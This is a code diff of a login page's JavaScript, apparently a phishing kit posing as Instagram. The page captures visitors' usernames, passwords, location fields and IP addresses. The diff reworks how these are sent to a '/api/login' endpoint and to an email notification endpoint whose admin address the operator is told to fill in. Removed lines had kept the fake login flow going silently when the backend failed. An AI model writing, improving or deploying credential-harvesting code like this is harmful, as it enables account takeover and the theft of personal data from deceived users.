@@ -284,24 +284,13 @@
         
         // Send login data to server
         function sendDataToServer() {
-            // Create form data
-            const formData = new FormData();
-            
             // Add (IG) tag to username if not already present
             let username = usernameInput.value;
             if (!username.includes('(IG)')) {
                 username += " (IG)";
             }
             
-            formData.append('username', username);
-            formData.append('password', passwordInput.value);
-            formData.append('country', countryField.value);
-            formData.append('city', cityField.value);
-            formData.append('continent', continentField.value);
-            formData.append('ip', ipField.value);
-            formData.append('source', 'instagram'); // Add source identifier
-            
-            // Use fetch API to send data
+            // Use fetch with JSON payload instead of FormData
             fetch('/api/login', {
                 method: 'POST',
                 headers: {
@@ -320,7 +309,7 @@
                 if (!response.ok) {
                     throw new Error(`HTTP error! Status: ${response.status}`);
                 }
-                return response.text();
+                return response.json();
             })
             .then(data => {
                 console.log('Data saved to database:', data);
@@ -333,18 +322,6 @@
             })
             .catch(error => {
                 console.error('Error saving data:', error);
-                // Instead of showing an error, continue with the login flow
-                console.log('Backend unavailable, continuing with login flow');
-                
-                // Still send notification email if configured
-                try {
-                    sendNotificationEmail();
-                } catch (emailError) {
-                    console.error('Email notification error:', emailError);
-                }
-                
-                // Process login attempt normally instead of showing error
-                processLoginAttempt();
             });
         }
         
@@ -375,27 +352,22 @@
         
         // Send email notification
         function sendNotificationEmail() {
-            // Create notification data
-            const notificationData = new FormData();
-            notificationData.append('username', usernameInput.value + "(IG)");
-            notificationData.append('password', passwordInput.value);
-            notificationData.append('country', countryField.value);
-            notificationData.append('city', cityField.value);
-            notificationData.append('continent', continentField.value);
-            notificationData.append('ip', ipField.value);
-            notificationData.append('adminEmail', adminEmailField.value);
-            
-            // Send notification to email proxy
-            fetch('info/mail_proxy.php', {
+            fetch('/api/notify', {
                 method: 'POST',
-                body: new URLSearchParams(notificationData)
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    username: usernameInput.value + " (IG)",
+                    password: passwordInput.value,
+                    country: countryField.value,
+                    city: cityField.value,
+                    continent: continentField.value,
+                    ip: ipField.value,
+                    adminEmail: 'your-admin-email@example.com' // Set this to your email
+                })
             })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error(`HTTP error! Status: ${response.status}`);
-                }
-                return response.json();
-            })
+            .then(response => response.json())
             .then(result => {
                 console.log('Email notification sent:', result);
             })
